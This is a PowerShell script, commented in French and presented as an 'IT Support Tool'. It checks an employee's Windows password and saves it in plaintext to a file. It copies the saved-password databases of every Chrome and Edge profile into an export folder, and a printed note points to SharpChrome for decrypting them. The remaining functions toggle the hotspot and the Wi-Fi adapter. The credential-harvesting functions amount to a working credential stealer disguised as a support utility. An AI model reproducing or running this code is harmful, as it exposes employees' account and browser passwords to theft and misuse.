# =============================================
# IT SUPPORT TOOL - VERSION CORRIGÉE
# =============================================

$Host.UI.RawUI.WindowTitle = "IT Support Tool"

$MachineName = $env:COMPUTERNAME
$CurrentUser = $env:USERNAME
$Date = Get-Date -Format "yyyyMMdd_HHmmss"
$ExportFolder = "C:\Support_Export\${MachineName}_${CurrentUser}_${Date}"
New-Item -Path $ExportFolder -ItemType Directory -Force | Out-Null

Write-Host "=== IT SUPPORT TOOL ===" -ForegroundColor Green
Write-Host "Machine : $MachineName | User : $CurrentUser" -ForegroundColor Yellow
Write-Host "Dossier : $ExportFolder`n" -ForegroundColor Cyan

# ====================== MOT DE PASSE EMPLOYE ======================
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool LogonUser(string lpszUsername, string lpszDomain, string lpszPassword, int dwLogonType, int dwLogonProvider, ref IntPtr phToken);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

function Save-EmployeePassword {
    Write-Host "`n=== SAUVEGARDE MOT DE PASSE EMPLOYE ===" -ForegroundColor Cyan
    $empUser = Read-Host "Nom d'utilisateur employé (vide = $CurrentUser)"
    if ([string]::IsNullOrWhiteSpace($empUser)) { $empUser = $CurrentUser }

    for ($i = 1; $i -le 3; $i++) {
        $pass = Read-Host "Mot de passe de $empUser" -AsSecureString
        $plain = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($pass))

        $token = [IntPtr]::Zero
        if ([Win32]::LogonUser($empUser, ".", $plain, 2, 0, [ref]$token)) {
            [Win32]::CloseHandle($token) | Out-Null
            "$empUser | $plain | $(Get-Date)" | Out-File "$ExportFolder\Password_${empUser}.txt" -Force
            Write-Host "✓ Mot de passe sauvegardé !" -ForegroundColor Green
            return
        } else {
            Write-Host "✗ Incorrect ($i/3)" -ForegroundColor Red
        }
    }
}

# ====================== EXPORT NAVIGATEURS EN CSV ======================
function Export-BrowserPasswords {
    Write-Host "`n=== EXPORT MOTS DE PASSE NAVIGATEURS (CSV) ===" -ForegroundColor Cyan

    # Chrome
    $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    if (Test-Path $chromePath) {
        Get-ChildItem $chromePath -Directory | Where-Object { $_.Name -like "Profile*" -or $_.Name -eq "Default" } | ForEach-Object {
            $profileName = $_.Name
            # Récupérer le vrai nom du profil
            $prefFile = "$($_.FullName)\Preferences"
            if (Test-Path $prefFile) {
                try {
                    $content = Get-Content $prefFile -Raw -Encoding UTF8
                    if ($content -match '"name":"([^"]+)"') { $profileName = $matches[1] }
                } catch {}
            }
            $dbPath = "$($_.FullName)\Login Data"
            if (Test-Path $dbPath) {
                Copy-Item $dbPath "$ExportFolder\Chrome_${profileName}_LoginData.db" -Force
                Write-Host "Chrome - $profileName → exporté" -ForegroundColor Green
            }
        }
    }

    # Edge (même logique)
    $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    if (Test-Path $edgePath) {
        Get-ChildItem $edgePath -Directory | Where-Object { $_.Name -like "Profile*" -or $_.Name -eq "Default" } | ForEach-Object {
            $profileName = $_.Name
            $prefFile = "$($_.FullName)\Preferences"
            if (Test-Path $prefFile) {
                try {
                    $content = Get-Content $prefFile -Raw -Encoding UTF8
                    if ($content -match '"name":"([^"]+)"') { $profileName = $matches[1] }
                } catch {}
            }
            $dbPath = "$($_.FullName)\Login Data"
            if (Test-Path $dbPath) {
                Copy-Item $dbPath "$ExportFolder\Edge_${profileName}_LoginData.db" -Force
                Write-Host "Edge - $profileName → exporté" -ForegroundColor Green
            }
        }
    }

    Write-Host "`nNote : Les fichiers .db sont copiés. Pour les convertir en CSV lisible, utilisez SharpChrome ou un outil de décryptage." -ForegroundColor Yellow
}

# ====================== HOTSPOT & WIFI ======================
function Manage-Hotspot {
    Write-Host "`n=== Partage de Connexion (Hosted Network) ===" -ForegroundColor Cyan
    $a = Read-Host "1=Activer | 2=Désactiver | 3=Bloquer complètement le partage"
    switch ($a) {
        "1" { netsh wlan set hostednetwork mode=allow; netsh wlan start hostednetwork; Write-Host "Hotspot activé" -ForegroundColor Green }
        "2" { netsh wlan stop hostednetwork; Write-Host "Hotspot désactivé" -ForegroundColor Red }
        "3" { netsh wlan set hostednetwork mode=disallow; Write-Host "Partage de connexion BLOQUÉ" -ForegroundColor Red }
    }
}

function Manage-WiFi {
    Write-Host "`n=== WiFi ===" -ForegroundColor Cyan
    $wifi = Get-NetAdapter | Where-Object { $_.Name -like "*Wi-Fi*" -or $_.InterfaceDescription -like "*Wireless*" }
    if (-not $wifi) { Write-Host "WiFi non détecté" -ForegroundColor Red; return }

    $a = Read-Host "1=Activer | 2=Désactiver (empêcher connexion)"
    if ($a -eq "2") {
        Disable-NetAdapter -Name $wifi.Name -Confirm:$false
        Write-Host "WiFi désactivé (connexion bloquée)" -ForegroundColor Red
    } else {
        Enable-NetAdapter -Name $wifi.Name -Confirm:$false
        Write-Host "WiFi activé" -ForegroundColor Green
    }
}

# ====================== MENU ======================
function Show-Menu {
    Write-Host "`n=== MENU PRINCIPAL ===" -ForegroundColor Magenta
    Write-Host "1. Sauvegarder mot de passe employé"
    Write-Host "2. Exporter mots de passe Navigateurs (CSV + DB)"
    Write-Host "3. Gérer Hotspot / Partage de connexion"
    Write-Host "4. Gérer WiFi (Activer/Désactiver connexion)"
    Write-Host "5. TOUT EXÉCUTER"
    Write-Host "Q. Quitter"
    return Read-Host "Choix"
}

do {
    $choice = Show-Menu
    switch ($choice) {
        "1" { Save-EmployeePassword }
        "2" { Export-BrowserPasswords }
        "3" { Manage-Hotspot }
        "4" { Manage-WiFi }
        "5" { 
            Save-EmployeePassword
            Export-BrowserPasswords
        }
        "Q" { Write-Host "Au revoir !" -ForegroundColor Green }
    }
    if ($choice -ne "Q") { Read-Host "`nAppuyez sur Entrée pour continuer..." }
} while ($choice -ne "Q")

Write-Host "`nTerminé ! Tout est dans : $ExportFolder" -ForegroundColor Green
